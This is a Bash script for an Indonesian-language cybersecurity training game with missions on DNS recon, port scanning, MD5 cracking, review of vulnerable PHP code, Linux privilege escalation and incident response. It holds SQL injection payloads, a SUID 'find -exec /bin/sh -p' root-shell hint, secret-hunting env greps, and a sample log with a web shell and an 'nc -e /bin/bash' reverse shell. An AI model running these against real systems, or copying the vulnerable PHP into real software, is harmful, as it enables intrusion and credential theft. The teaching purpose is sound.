#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
DIM='\033[2m'
BOLD='\033[1m'
RESET='\033[0m'

BASEDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BASEDIR_MOD="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
if [ -z "$CYBERTUZ_LANG" ]; then
    source "$BASEDIR_MOD/lang.sh"
    ct_load_lang || _ct_set_lang "en"
fi

SAVEDIR="$BASEDIR/logs"
MISI_SAVE="$SAVEDIR/misi_selesai.dat"
MISI_LOG="$SAVEDIR/misi_log.dat"

mkdir -p "$SAVEDIR"

jeda() {
    echo ""
    echo -ne "${DIM}  $CT_ENTER${RESET}"
    read -r
}

selesaikan_misi() {
    local id="$1"
    local nama="$2"
    grep -q "^$id:" "$MISI_SAVE" 2>/dev/null || echo "$id:$nama:$(date '+%Y-%m-%d %H:%M')" >> "$MISI_SAVE"
    echo "SELESAI|$id|$nama|$(date '+%Y-%m-%d %H:%M')" >> "$MISI_LOG"
}

cek_misi_selesai() {
    grep -q "^$1:" "$MISI_SAVE" 2>/dev/null
}

header_misi() {
    local id="$1"
    local judul="$2"
    local kat="$3"
    local diff="$4"
    local warna="$5"
    clear
    echo -e "${warna}"
    echo "  ╔══════════════════════════════════════════════════════════════╗"
    echo "  ║                    $CT_MISSION_HDR                     ║"
    echo "  ╚══════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    echo -e "  ID Misi    : ${WHITE}$id${RESET}"
    echo -e "  Judul      : ${warna}${BOLD}$judul${RESET}"
    echo -e "  Kategori   : $kat"
    echo -e "  Kesulitan  : ${warna}$diff${RESET}"
    echo ""
    echo -e "${CYAN}  ----------------------------------------------------------------${RESET}"
    echo ""
}

sukses() { echo -e "  ${GREEN}[$CT_SUCCESS]${RESET} $1"; }
gagal()  { echo -e "  ${RED}[$CT_FAIL]${RESET} $1"; }
hint()   { echo -e "  ${YELLOW}[$CT_HINT]${RESET} $1"; }
obj()    { echo -e "  ${CYAN}  ->  ${RESET}$1"; }
verif()  { echo -e "  ${MAGENTA}[$CT_VERIFY]${RESET} $1"; }


misi_M01() {
    header_misi "M-01" "Investigasi Domain Target" "Reconnaissance" "Mudah" "$GREEN"

    echo -e "${WHITE}  $CT_BACKGROUND:${RESET}"
    echo "  Klien baru minta kamu lakukan initial recon terhadap"
    echo "  salah satu domain publik sebagai latihan. Kamu diminta"
    echo "  mengumpulkan informasi sebanyak mungkin secara pasif."
    echo ""
    echo -e "${WHITE}  $CT_OBJECTIVE:${RESET}"
    obj "Lakukan DNS lookup dan catat IP address target"
    obj "Temukan mail server (MX record) dari domain target"
    obj "Cek TXT record dan identifikasi apakah ada SPF record"
    obj "Probe minimal 3 subdomain umum"
    obj "Dokumentasikan semua temuan dalam format ringkas"
    echo ""
    echo -e "${YELLOW}  Target latihan: google.com (domain publik, legal untuk passive recon)${RESET}"
    jeda

    clear
    header_misi "M-01" "Investigasi Domain Target" "Reconnaissance" "Mudah" "$GREEN"
    echo -e "${WHITE}  $CT_EXEC:${RESET}"
    echo ""

    echo -ne "  Masukkan domain yang akan diinvestigasi (default: google.com): "
    read -r target
    [ -z "$target" ] && target="google.com"
    echo ""

    echo -e "${CYAN}  [LANGKAH 1] DNS A Record${RESET}"
    if command -v nslookup &>/dev/null; then
        nslookup "$target" 2>/dev/null | grep -E "^Address" | grep -v "#53" | head -5 | sed 's/^/  /'
    elif command -v host &>/dev/null; then
        host -t A "$target" 2>/dev/null | head -5 | sed 's/^/  /'
    else
        echo "  Install: pkg install dnsutils"
    fi
    echo ""

    echo -e "${CYAN}  [LANGKAH 2] MX Record${RESET}"
    if command -v nslookup &>/dev/null; then
        nslookup -type=MX "$target" 2>/dev/null | grep -i "mail" | head -5 | sed 's/^/  /'
    elif command -v host &>/dev/null; then
        host -t MX "$target" 2>/dev/null | head -5 | sed 's/^/  /'
    fi
    echo ""

    echo -e "${CYAN}  [LANGKAH 3] TXT Record (SPF, DKIM, dll)${RESET}"
    if command -v nslookup &>/dev/null; then
        nslookup -type=TXT "$target" 2>/dev/null | grep "text" | head -5 | sed 's/^/  /'
    elif command -v host &>/dev/null; then
        host -t TXT "$target" 2>/dev/null | head -5 | sed 's/^/  /'
    fi
    echo ""

    echo -e "${CYAN}  [LANGKAH 4] Probe Subdomain${RESET}"
    found=0
    for sub in www mail ftp api dev admin portal vpn remote; do
        r=$(nslookup "$sub.$target" 2>/dev/null | grep "Address" | grep -v "#53" | head -1)
        if [ -n "$r" ]; then
            echo -e "  ${GREEN}  [+]${RESET} $sub.$target -> $(echo $r | awk '{print $2}')"
            ((found++))
        fi
    done
    echo ""
    echo "  Total subdomain ditemukan: $found"
    echo ""

    echo -e "${CYAN}  [LANGKAH 5] HTTP Headers${RESET}"
    if command -v curl &>/dev/null; then
        curl -sI --max-time 5 "https://$target" 2>/dev/null | grep -iE "server:|x-powered|content-type|strict-transport|x-frame" | head -8 | sed 's/^/  /'
    fi
    echo ""

    echo -e "${WHITE}  $CT_VERIFY:${RESET}"
    echo ""
    verif "Apakah kamu berhasil mendapatkan IP address dari $target?"
    echo -ne "  (ya/tidak): "
    read -r v1

    verif "Apakah MX record ditemukan?"
    echo -ne "  (ya/tidak): "
    read -r v2

    verif "Berapa subdomain yang ditemukan?"
    echo -ne "  Jumlah: "
    read -r v3

    lulus=0
    [[ "${v1,,}" == "ya" ]] && ((lulus++))
    [[ "${v2,,}" == "ya" ]] && ((lulus++))
    [[ "$v3" =~ ^[1-9][0-9]*$ ]] && ((lulus++))

    echo ""
    if [ "$lulus" -ge 2 ]; then
        sukses "Misi M-01 berhasil diselesaikan!"
        sukses "Kamu sudah bisa melakukan passive DNS recon."
        selesaikan_misi "M-01" "Investigasi Domain Target"
    else
        gagal "Misi belum selesai. Pastikan semua objektif terpenuhi."
        hint "Coba install: pkg install dnsutils nmap curl"
    fi
    jeda
}


misi_M02() {
    header_misi "M-02" "Port Scan & Service Fingerprinting" "Scanning" "Mudah" "$GREEN"

    echo -e "${WHITE}  $CT_BACKGROUND:${RESET}"
    echo "  Setelah recon domain, kamu perlu mengetahui service apa saja"
    echo "  yang berjalan di target. Scan port dan identifikasi versi service."
    echo ""
    echo -e "${WHITE}  $CT_OBJECTIVE:${RESET}"
    obj "Scan top 100 port di scanme.nmap.org"
    obj "Identifikasi minimal 2 port yang open"
    obj "Gunakan flag -sV untuk detect service version"
    obj "Temukan OS atau versi SSH jika ada"
    obj "Catat semua temuan dan nilai risikonya"
    echo ""
    echo -e "${YELLOW}  Target: scanme.nmap.org (server resmi nmap untuk latihan)${RESET}"
    jeda

    clear
    header_misi "M-02" "Port Scan & Service Fingerprinting" "Scanning" "Mudah" "$GREEN"

    if ! command -v nmap &>/dev/null; then
        echo -e "  ${RED}  nmap belum terinstall!${RESET}"
        echo "  Jalankan: pkg install nmap"
        hint "Setelah install nmap, coba misi ini lagi."
        jeda
        return
    fi

    echo -e "${WHITE}  $CT_EXEC:${RESET}"
    echo ""
    echo -e "${CYAN}  [LANGKAH 1] Basic Scan scanme.nmap.org${RESET}"
    echo ""
    echo -e "  ${DIM}  Menjalankan: nmap -T4 --top-ports 100 scanme.nmap.org${RESET}"
    echo ""
    scan_out=$(nmap -T4 --top-ports 100 scanme.nmap.org 2>/dev/null)
    echo "$scan_out" | grep -E "open|closed|filtered|Nmap scan" | head -20 | sed 's/^/  /'
    echo ""

    open_ports=$(echo "$scan_out" | grep "/tcp" | grep "open" | wc -l)
    echo -e "  Port open ditemukan: ${WHITE}$open_ports${RESET}"
    echo ""

    echo -e "${CYAN}  [LANGKAH 2] Service Version Detection${RESET}"
    echo ""
    echo -e "  ${DIM}  Menjalankan: nmap -sV -p 22,80,443 scanme.nmap.org${RESET}"
    echo ""
    nmap -sV -p 22,80,443 --version-intensity 2 scanme.nmap.org 2>/dev/null | grep -E "open|VERSION|ssh|http" | head -10 | sed 's/^/  /'
    echo ""

    echo -e "${WHITE}  ANALISIS TEMUAN:${RESET}"
    echo ""
    echo "  Berdasarkan hasil scan di atas, jawab pertanyaan berikut:"
    echo ""
    echo -ne "  Port berapa saja yang open? (pisah koma): "
    read -r ports_found

    echo -ne "  Apakah SSH (port 22) open? (ya/tidak): "
    read -r ssh_open

    echo -ne "  Versi service apa yang berhasil diidentifikasi? (sebutkan satu): "
    read -r versi_found

    echo ""
    echo -e "${WHITE}  $CT_VERIFY:${RESET}"
    echo ""
    lulus=0
    [ "$open_ports" -gt 0 ] && ((lulus++)) && sukses "Scan berhasil menemukan port open."
    [[ -n "$ports_found" ]] && ((lulus++)) && sukses "Kamu mencatat port yang open."
    [[ -n "$versi_found" ]] && ((lulus++)) && sukses "Kamu mengidentifikasi service version."

    echo ""
    if [ "$lulus" -ge 2 ]; then
        sukses "Misi M-02 berhasil diselesaikan!"
        selesaikan_misi "M-02" "Port Scan & Service Fingerprinting"
    else
        gagal "Misi belum selesai. Pastikan nmap berjalan dan kamu menganalisis hasilnya."
    fi
    jeda
}


misi_M03() {
    header_misi "M-03" "Analisis Kriptografi & Hash Cracking" "Kriptografi" "Sedang" "$YELLOW"

    echo -e "${WHITE}  $CT_BACKGROUND:${RESET}"
    echo "  Tim forensik menemukan database backup dari server yang dikompromis."
    echo "  Di dalamnya terdapat hash password user. Kamu diminta menganalisis"
    echo "  jenis hash dan mencoba crack beberapa yang lemah."
    echo ""
    echo -e "${WHITE}  $CT_OBJECTIVE:${RESET}"
    obj "Identifikasi jenis algoritma hash dari setiap sample"
    obj "Decode sample yang bukan hash (encoding)"
    obj "Crack hash MD5 menggunakan teknik yang dipelajari"
    obj "Berikan rekomendasi algoritma yang aman untuk penyimpanan password"
    jeda

    clear
    header_misi "M-03" "Analisis Kriptografi & Hash Cracking" "Kriptografi" "Sedang" "$YELLOW"

    echo -e "${WHITE}  DATA TEMUAN (dari backup database):${RESET}"
    echo ""
    echo -e "  ${DIM}  User    | Hash / Encoded Value${RESET}"
    echo "  ---------------------------------------------------------------"
    echo "  alice   | 5f4dcc3b5aa765d61d8327deb882cf99"
    echo "  bob     | aGVsbG93b3JsZA=="
    echo "  charlie | \$2y\$10\$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
    echo "  dave    | e10adc3949ba59abbe56e057f20f883e"
    echo "  eve     | 0beec7b5ea3f0fdbc95d0dd47f3c5bc275da8a33"
    echo ""
    jeda

    clear
    header_misi "M-03" "Analisis Kriptografi & Hash Cracking" "Kriptografi" "Sedang" "$YELLOW"

    echo -e "${WHITE}  TUGAS 1: Identifikasi Algoritma${RESET}"
    echo ""

    echo "  Hash alice: 5f4dcc3b5aa765d61d8327deb882cf99 (32 karakter)"
    echo -ne "  Algoritma hash apa ini? "
    read -r j1
    if echo "${j1,,}" | grep -q "md5"; then
        sukses "Benar. MD5 menghasilkan 32 karakter hexadecimal."
    else
        gagal "Jawaban: MD5 (32 hex chars)."
    fi
    echo ""

    echo "  Hash bob: aGVsbG93b3JsZA== (diakhiri ==)"
    echo -ne "  Ini bukan hash, melainkan encoding apa? "
    read -r j2
    if echo "${j2,,}" | grep -q "base64"; then
        sukses "Benar. Karakter = di akhir adalah padding khas Base64."
    else
        gagal "Jawaban: Base64 encoding."
    fi
    echo ""

    echo "  Decode nilai bob:"
    if command -v base64 &>/dev/null; then
        decoded=$(echo "aGVsbG93b3JsZA==" | base64 -d 2>/dev/null)
        echo -e "  ${CYAN}  Hasil decode: $decoded${RESET}"
    fi
    echo ""

    echo "  Hash charlie: \$2y\$10\$N9qo... (diawali \$2y\$)"
    echo -ne "  Algoritma hash apa ini? "
    read -r j3
    if echo "${j3,,}" | grep -q "bcrypt"; then
        sukses "Benar. bcrypt diawali \$2y\$ atau \$2b\$. Sangat aman untuk password."
    else
        gagal "Jawaban: bcrypt. Ini adalah pilihan terbaik untuk hash password."
    fi
    echo ""

    echo "  Hash eve: 0beec7b5ea3f0fdbc95d0dd47f3c5bc275da8a33 (40 karakter)"
    echo -ne "  Algoritma hash apa ini? "
    read -r j4
    if echo "${j4,,}" | grep -q "sha1"; then
        sukses "Benar. SHA1 menghasilkan 40 karakter hexadecimal."
    else
        gagal "Jawaban: SHA1 (40 hex chars). Sudah deprecated sejak 2017."
    fi
    jeda

    clear
    header_misi "M-03" "Analisis Kriptografi & Hash Cracking" "Kriptografi" "Sedang" "$YELLOW"

    echo -e "${WHITE}  TUGAS 2: Simulasi Hash Cracking${RESET}"
    echo ""

    if command -v python3 &>/dev/null; then
        python3 << 'PYEOF'
import hashlib

target_hashes = {
    "5f4dcc3b5aa765d61d8327deb882cf99": None,
    "e10adc3949ba59abbe56e057f20f883e": None
}

wordlist = [
    "password", "123456", "admin", "qwerty", "letmein",
    "monkey", "dragon", "master", "sunshine", "princess",
    "welcome", "shadow", "superman", "michael", "football"
]

print("  Menjalankan dictionary attack terhadap MD5 hashes...")
print()
cracked = 0
for word in wordlist:
    h = hashlib.md5(word.encode()).hexdigest()
    if h in target_hashes:
        target_hashes[h] = word
        print(f"  [CRACK] Hash: {h}")
        print(f"          Password: {word}")
        print()
        cracked += 1

print(f"  Total berhasil di-crack: {cracked}/{len(target_hashes)}")
print()
print("  Kesimpulan: MD5 sangat lemah. Wordlist kecil sudah cukup.")
print("  Gunakan bcrypt/Argon2 dengan salt untuk password production.")
PYEOF
    else
        echo "  Python3 tidak tersedia. Contoh hasil cracking:"
        echo "  Hash 5f4dcc3b5aa765d61d8327deb882cf99 = 'password'"
        echo "  Hash e10adc3949ba59abbe56e057f20f883e = '123456'"
    fi
    echo ""

    echo -e "${WHITE}  TUGAS 3: Rekomendasi${RESET}"
    echo ""
    echo "  Dari temuan di atas, berikan rekomendasi algoritma hash yang aman."
    echo ""
    echo -ne "  Algoritma apa yang seharusnya dipakai? (sebutkan satu atau lebih): "
    read -r rekomendasi

    lulus=0
    echo "${rekomendasi,,}" | grep -qE "bcrypt|argon2|scrypt|pbkdf2" && ((lulus++))

    echo ""
    if [ "$lulus" -gt 0 ]; then
        sukses "Rekomendasi tepat!"
        echo ""
        echo "  Perbandingan:"
        echo "  MD5 / SHA1     -> JANGAN dipakai untuk password"
        echo "  SHA256 / SHA512 -> Boleh untuk checksumfile, BUKAN untuk password"
        echo "  bcrypt         -> Bagus untuk password, built-in salt"
        echo "  Argon2         -> Terbaik saat ini, pemenang PHC 2015"
        echo "  scrypt         -> Memory-hard, tahan GPU attack"
        sukses "Misi M-03 berhasil diselesaikan!"
        selesaikan_misi "M-03" "Analisis Kriptografi & Hash Cracking"
    else
        gagal "Rekomendasi kurang tepat."
        hint "Jawaban yang baik: bcrypt, Argon2, atau scrypt."
    fi
    jeda
}


misi_M04() {
    header_misi "M-04" "Web Vulnerability Hunting" "Web Security" "Sedang" "$YELLOW"

    echo -e "${WHITE}  $CT_BACKGROUND:${RESET}"
    echo "  Kamu diminta melakukan security assessment terhadap web application"
    echo "  yang disimulasikan. Temukan semua vulnerability dan dokumentasikan"
    echo "  dengan detail termasuk bukti (evidence) dan langkah reproduksi."
    echo ""
    echo -e "${WHITE}  $CT_OBJECTIVE:${RESET}"
    obj "Identifikasi vulnerability berdasarkan kode dan skenario yang diberikan"
    obj "Tentukan dampak (impact) setiap vulnerability"
    obj "Klasifikasikan severity menggunakan CVSS rating"
    obj "Tulis proof-of-concept (PoC) untuk setiap temuan"
    obj "Berikan langkah remediation yang konkret"
    jeda

    clear
    header_misi "M-04" "Web Vulnerability Hunting" "Web Security" "Sedang" "$YELLOW"

    echo -e "${WHITE}  KODE APLIKASI UNTUK DIANALISIS:${RESET}"
    echo ""
    echo "  ---- File: login.php ----"
    echo -e "${DIM}"
    cat << 'PHPEOF'
  <?php
  $conn = mysqli_connect("localhost", "root", "", "webapp_db");
  
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
      $user = $_POST["username"];
      $pass = $_POST["password"];
      
      $sql = "SELECT * FROM users WHERE username='$user' AND password='" . md5($pass) . "'";
      $result = mysqli_query($conn, $sql);
      
      if (mysqli_num_rows($result) > 0) {
          $row = mysqli_fetch_assoc($result);
          $_SESSION["user"] = $row["username"];
          $_SESSION["role"] = $row["role"];
          header("Location: /dashboard.php");
      } else {
          echo "<p>Login gagal: " . mysqli_error($conn) . "</p>";
      }
  }
  ?>
  <form method="POST">
      <input name="username"><input name="password" type="password">
      <button>Login</button>
  </form>
PHPEOF
    echo -e "${RESET}"
    echo ""
    echo "  ---- File: profile.php ----"
    echo -e "${DIM}"
    cat << 'PHPEOF'
  <?php
  $id = $_GET["id"];
  $sql = "SELECT * FROM users WHERE id = " . $id;
  $result = mysqli_query($conn, $sql);
  $user = mysqli_fetch_assoc($result);
  echo "<h1>Profil: " . $user["username"] . "</h1>";
  echo "<p>Email: " . $user["email"] . "</p>";
  echo "<p>Bio: " . $user["bio"] . "</p>";
  ?>
PHPEOF
    echo -e "${RESET}"
    jeda

    clear
    header_misi "M-04" "Web Vulnerability Hunting" "Web Security" "Sedang" "$YELLOW"

    skor=0

    echo -e "${WHITE}  $CT_ANALYSIS: login.php${RESET}"
    echo ""

    echo "  Temuan 1: Berapa vulnerability yang kamu temukan di login.php?"
    echo -ne "  Jumlah (angka): "
    read -r j
    if [[ "$j" =~ ^[2-9]$|^[1-9][0-9]+ ]]; then
        sukses "Ada minimal 3 vulnerability di login.php."
        ((skor++))
    else
        hint "Perhatikan: SQL injection, error disclosure, MD5 tanpa salt."
    fi
    echo ""

    echo "  Temuan 2: Baris kode ini berbahaya. Jelaskan kenapa:"
    echo -e "  ${RED}  \$sql = \"SELECT * FROM users WHERE username='\$user' ...\"${RESET}"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if echo "${j,,}" | grep -qE "inject|sqli|input|sanitasi|escape|prepared"; then
        sukses "Benar. Input langsung digabung ke SQL query = SQL Injection."
        ((skor++))
    else
        gagal "Input \$user langsung masuk ke query tanpa sanitasi = SQL Injection."
    fi
    echo ""

    echo "  Temuan 3: Baris ini membocorkan informasi sensitif:"
    echo -e "  ${RED}  echo \"<p>Login gagal: \" . mysqli_error(\$conn) . \"</p>\";${RESET}"
    echo ""
    echo "  Apa yang bocor dan bagaimana dampaknya?"
    echo -ne "  Jawab: "
    read -r j
    if echo "${j,,}" | grep -qE "error|mysql|query|struktur|database|tabel|kolom"; then
        sukses "Error MySQL bocorkan struktur database, nama tabel, dan query."
        ((skor++))
    else
        gagal "mysqli_error() bocorkan detail error MySQL ke user -> info gathering."
    fi
    echo ""

    echo "  Temuan 4: md5(\$pass) dipakai untuk hash password. Masalahnya?"
    echo -ne "  Jawab: "
    read -r j
    if echo "${j,,}" | grep -qE "md5.*lemah|broken|crack|rainbow|salt|tidak.*aman"; then
        sukses "MD5 sudah broken. Mudah di-crack dengan rainbow table. Tidak ada salt."
        ((skor++))
    else
        gagal "MD5 sudah broken sejak lama. Gunakan bcrypt/Argon2 dengan salt."
    fi
    jeda

    clear
    header_misi "M-04" "Web Vulnerability Hunting" "Web Security" "Sedang" "$YELLOW"

    echo -e "${WHITE}  $CT_ANALYSIS: profile.php${RESET}"
    echo ""

    echo "  Temuan 5: profile.php?id=1 - vulnerability apa yang ada?"
    echo ""
    echo "  a) XSS saja"
    echo "  b) SQL Injection dan IDOR sekaligus"
    echo "  c) CSRF saja"
    echo "  d) Tidak ada vulnerability"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        sukses "Benar! SQLi dari \$id langsung ke query. IDOR dari bisa akses profil sembarang ID."
        ((skor++))
    else
        gagal "Jawaban: b) SQL Injection (\$id tidak disanitasi) + IDOR (ganti id=1 ke id=2)."
    fi
    echo ""

    echo "  Temuan 6: Field bio user ditampilkan tanpa encoding:"
    echo -e "  ${RED}  echo \"<p>Bio: \" . \$user[\"bio\"] . \"</p>\";${RESET}"
    echo ""
    echo "  Jika bio berisi: <script>alert(1)</script>"
    echo "  Vulnerability apa ini?"
    echo -ne "  Jawab: "
    read -r j
    if echo "${j,,}" | grep -qE "xss|cross.*site|stored|script"; then
        sukses "Stored XSS! Bio tersimpan di DB dan ditampilkan tanpa encoding."
        ((skor++))
    else
        gagal "Stored XSS. Bio dari DB langsung di-echo ke HTML = XSS."
    fi
    jeda

    clear
    header_misi "M-04" "Web Vulnerability Hunting" "Web Security" "Sedang" "$YELLOW"

    echo -e "${WHITE}  TUGAS AKHIR: LAPORAN SINGKAT${RESET}"
    echo ""
    echo "  Buat ringkasan temuan dengan format:"
    echo "  [Nama Vuln] | [File] | [Severity] | [Remediasi]"
    echo ""
    echo "  Contoh format:"
    echo "  SQL Injection | login.php | Critical | Gunakan prepared statement"
    echo ""
    echo -ne "  Masukkan minimal 1 temuan kamu: "
    read -r laporan

    if [[ -n "$laporan" ]]; then
        sukses "Laporan dicatat."
        echo "$laporan" >> "$MISI_LOG"
        ((skor++))
    fi

    echo ""
    echo -e "${WHITE}  $CT_RESULT:${RESET}"
    echo ""
    persen=$(( skor * 100 / 7 ))
    echo -e "  Vulnerability teridentifikasi: ${WHITE}$skor / 7 poin${RESET} ($persen%)"
    echo ""

    if [ "$skor" -ge 5 ]; then
        sukses "Misi M-04 berhasil diselesaikan dengan baik!"
        selesaikan_misi "M-04" "Web Vulnerability Hunting"
    elif [ "$skor" -ge 3 ]; then
        echo -e "  ${YELLOW}  Cukup. Pelajari lagi materi Web Security untuk hasil lebih baik.${RESET}"
    else
        gagal "Perlu belajar lebih banyak. Kunjungi modul Web Application Security."
    fi
    jeda
}


misi_M05() {
    header_misi "M-05" "Linux Post-Exploitation Walkthrough" "Linux Security" "Sulit" "$RED"

    echo -e "${WHITE}  $CT_BACKGROUND:${RESET}"
    echo "  Kamu mendapat akses awal ke server Linux sebagai user 'webuser'."
    echo "  Tugasmu: enumerate sistem, temukan vektor privilege escalation,"
    echo "  dan dokumentasikan langkah-langkah yang diambil."
    echo ""
    echo -e "${WHITE}  $CT_OBJECTIVE:${RESET}"
    obj "Lakukan enumerasi sistem: user, grup, OS, kernel"
    obj "Temukan semua SUID binary di sistem"
    obj "Periksa sudo privileges yang tersedia"
    obj "Cari file konfigurasi yang mungkin berisi credential"
    obj "Identifikasi minimal 1 vektor privilege escalation"
    obj "Tuliskan langkah PoC untuk eskalasi yang ditemukan"
    jeda

    clear
    header_misi "M-05" "Linux Post-Exploitation Walkthrough" "Linux Security" "Sulit" "$RED"

    echo -e "${WHITE}  EKSEKUSI - ENUMERASI SISTEM:${RESET}"
    echo ""
    echo -e "${CYAN}  [1] Identitas & Context${RESET}"
    echo "  $ id"
    id | sed 's/^/  /'
    echo ""
    echo "  $ uname -a"
    uname -a | sed 's/^/  /'
    echo ""

    echo -e "${CYAN}  [2] Daftar User yang Bisa Login${RESET}"
    echo "  $ cat /etc/passwd | grep -v nologin | grep -v false"
    cat /etc/passwd 2>/dev/null | grep -vE "nologin|false|halt|sync|shutdown" | head -10 | sed 's/^/  /'
    echo ""

    echo -e "${CYAN}  [3] SUID Binary${RESET}"
    echo "  $ find /usr/bin /bin -perm -4000 -type f 2>/dev/null"
    find /usr/bin /bin 2>/dev/null -perm -4000 -type f 2>/dev/null | head -10 | sed 's/^/  /'
    echo ""

    echo -e "${CYAN}  [4] Sudo Rights${RESET}"
    echo "  $ sudo -l"
    sudo -l 2>/dev/null | head -8 | sed 's/^/  /' || echo "  (sudo tidak tersedia atau perlu password)"
    echo ""

    echo -e "${CYAN}  [5] Port Listening Internal${RESET}"
    echo "  $ ss -tlnp"
    ss -tlnp 2>/dev/null | head -8 | sed 's/^/  /' || netstat -tlnp 2>/dev/null | head -8 | sed 's/^/  /'
    echo ""

    echo -e "${CYAN}  [6] Environment Variables${RESET}"
    echo "  $ env | grep -iE 'pass|key|secret|token'"
    env 2>/dev/null | grep -iE "pass|key|secret|token|api|db_" | sed 's/^/  /' | head -5
    echo ""
    jeda

    clear
    header_misi "M-05" "Linux Post-Exploitation Walkthrough" "Linux Security" "Sulit" "$RED"

    echo -e "${WHITE}  $CT_ANALYSIS:${RESET}"
    echo ""
    skor=0

    suid_list=$(find /usr/bin /bin 2>/dev/null -perm -4000 -type f 2>/dev/null)
    suid_count=$(echo "$suid_list" | grep -c . 2>/dev/null || echo 0)

    echo -ne "  Berapa SUID binary yang kamu temukan? "
    read -r j
    if [[ "$j" =~ ^[0-9]+$ ]]; then
        sukses "Terdeteksi $suid_count SUID binary."
        ((skor++))
    fi
    echo ""

    echo "  Dari daftar SUID binary, apakah ada yang bisa dieksploitasi?"
    echo "  (Cek referensi GTFOBins: https://gtfobins.github.io)"
    echo ""
    echo "  SUID binary yang ditemukan di sistem ini:"
    echo "$suid_list" | head -8 | sed 's/^/  /'
    echo ""
    echo -ne "  Binary mana yang menarik untuk di-exploit? "
    read -r j
    if [[ -n "$j" ]]; then
        sukses "Catat binary itu dan cek di GTFOBins."
        ((skor++))
    fi
    echo ""

    echo "  Jika /usr/bin/find punya SUID root, bagaimana cara dapat shell root?"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if echo "$j" | grep -qE "exec|find.*exec|/bin/sh|/bin/bash|-exec"; then
        sukses "Benar. find . -exec /bin/sh -p \\; -> shell root via find SUID."
        ((skor++))
    else
        hint "Jawaban: find . -exec /bin/sh -p \\;"
        hint "Atau: find / -name test -exec /bin/bash -p \\;"
    fi
    echo ""

    echo "  Perintah apa yang kamu jalankan untuk cari file writable oleh user ini?"
    echo ""
    echo -ne "  Ketik perintah: "
    read -r j
    if echo "$j" | grep -qE "find.*writable|find.*-w|find.*perm.*-222|find.*perm.*-002"; then
        sukses "Benar. find / -writable -type f 2>/dev/null"
        ((skor++))
    else
        hint "Jawaban: find / -writable -type f 2>/dev/null"
        hint "Atau: find / -perm -002 -type f 2>/dev/null"
    fi
    echo ""

    echo "  Perintah apa yang dipakai untuk cari file dengan kata 'password' di dalamnya?"
    echo ""
    echo -ne "  Ketik perintah: "
    read -r j
    if echo "$j" | grep -qE "grep.*-r.*pass|grep.*pass.*-r|grep.*-ri"; then
        sukses "Benar. grep -r 'password' /var/www/ 2>/dev/null"
        ((skor++))
    else
        hint "Jawaban: grep -r 'password' /var/www/ 2>/dev/null"
    fi
    echo ""

    echo "  Tuliskan satu skenario privilege escalation yang kamu temukan:"
    echo ""
    echo -ne "  Skenario: "
    read -r j
    if [[ -n "$j" && ${#j} -gt 10 ]]; then
        sukses "Skenario dicatat."
        echo "MISI-M05-SKENARIO: $j" >> "$MISI_LOG"
        ((skor++))
    fi

    echo ""
    persen=$(( skor * 100 / 6 ))
    echo -e "  Skor: ${WHITE}$skor / 6${RESET} ($persen%)"
    echo ""

    if [ "$skor" -ge 4 ]; then
        sukses "Misi M-05 berhasil diselesaikan!"
        selesaikan_misi "M-05" "Linux Post-Exploitation Walkthrough"
    else
        gagal "Selesaikan misi sebelumnya dan pelajari modul Linux Security."
    fi
    jeda
}


misi_M06() {
    header_misi "M-06" "Incident Response Simulation" "Defensive Security" "Sulit" "$RED"

    echo -e "${WHITE}  $CT_BACKGROUND:${RESET}"
    echo "  Kamu adalah Security Analyst. SOC menerima alert:"
    echo "  'Unusual outbound connection detected from web server'"
    echo "  Tugasmu: investigasi, identifikasi insiden, dan buat laporan."
    echo ""
    echo -e "${WHITE}  $CT_OBJECTIVE:${RESET}"
    obj "Analisis log yang diberikan dan identifikasi aktivitas mencurigakan"
    obj "Tentukan timeline insiden"
    obj "Identifikasi IOC (Indicators of Compromise)"
    obj "Tentukan langkah containment yang harus diambil"
    obj "Buat ringkasan laporan insiden"
    jeda

    clear
    header_misi "M-06" "Incident Response Simulation" "Defensive Security" "Sulit" "$RED"

    echo -e "${WHITE}  LOG YANG DITEMUKAN:${RESET}"
    echo ""
    echo -e "${DIM}  === /var/log/apache2/access.log (excerpt) ===${RESET}"
    echo ""
    echo -e "${DIM}"
    cat << 'LOGEOF'
  192.168.1.50 - - [15/Mar/2024:08:12:01] "GET /index.php HTTP/1.1" 200 4523
  192.168.1.50 - - [15/Mar/2024:08:12:03] "GET /login.php HTTP/1.1" 200 892
  203.0.113.42 - - [15/Mar/2024:09:45:11] "GET /login.php?id=1' HTTP/1.1" 500 0
  203.0.113.42 - - [15/Mar/2024:09:45:12] "GET /login.php?id=1 OR 1=1-- HTTP/1.1" 200 8921
  203.0.113.42 - - [15/Mar/2024:09:45:14] "GET /login.php?id=1 UNION SELECT 1,table_name,3 FROM information_schema.tables-- HTTP/1.1" 200 12341
  203.0.113.42 - - [15/Mar/2024:09:46:01] "GET /login.php?id=1 UNION SELECT 1,username,password FROM users-- HTTP/1.1" 200 15023
  203.0.113.42 - - [15/Mar/2024:10:01:33] "POST /admin/upload.php HTTP/1.1" 200 423
  203.0.113.42 - - [15/Mar/2024:10:02:11] "GET /uploads/cmd.php?c=id HTTP/1.1" 200 52
  203.0.113.42 - - [15/Mar/2024:10:02:15] "GET /uploads/cmd.php?c=cat+/etc/passwd HTTP/1.1" 200 1823
  203.0.113.42 - - [15/Mar/2024:10:02:45] "GET /uploads/cmd.php?c=nc+10.0.0.1+4444+-e+/bin/bash HTTP/1.1" 200 0
LOGEOF
    echo -e "${RESET}"
    echo ""
    jeda

    clear
    header_misi "M-06" "Incident Response Simulation" "Defensive Security" "Sulit" "$RED"

    skor=0

    echo -e "${WHITE}  $CT_ANALYSIS:${RESET}"
    echo ""

    echo "  Pertanyaan 1: IP attacker adalah?"
    echo -ne "  Jawab: "
    read -r j
    if echo "$j" | grep -q "203.0.113.42"; then
        sukses "Benar. 203.0.113.42 adalah sumber semua aktivitas mencurigakan."
        ((skor++))
    else
        gagal "IP attacker: 203.0.113.42"
